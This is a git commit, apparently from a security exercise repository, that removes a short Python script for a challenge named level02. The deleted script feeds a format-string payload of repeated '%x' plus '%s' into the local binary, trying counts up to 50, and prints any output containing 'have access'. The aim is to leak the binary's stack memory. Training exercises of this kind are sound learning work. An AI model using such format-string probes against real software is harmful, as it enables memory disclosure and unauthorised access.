212484aa873cceea18f2df69db3b471c8fa8f862
Sawyerf <sawyer.flink@protonmail.ch>
2021-10-26 17:44:54 +0200

    Up: level02

--- level02/Ressources/lol.py
+++
@@ -1,7 +0,0 @@
-import subprocess
-
-for i in range(50):
-        p = subprocess.Popen('(python -c "print(\'%x\' * {} + \' %s\')" ; echo bite) | ./level02'.format(i), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        for line in p.stdout.readlines():
-                if 'have access' in line:
-                        print(line)
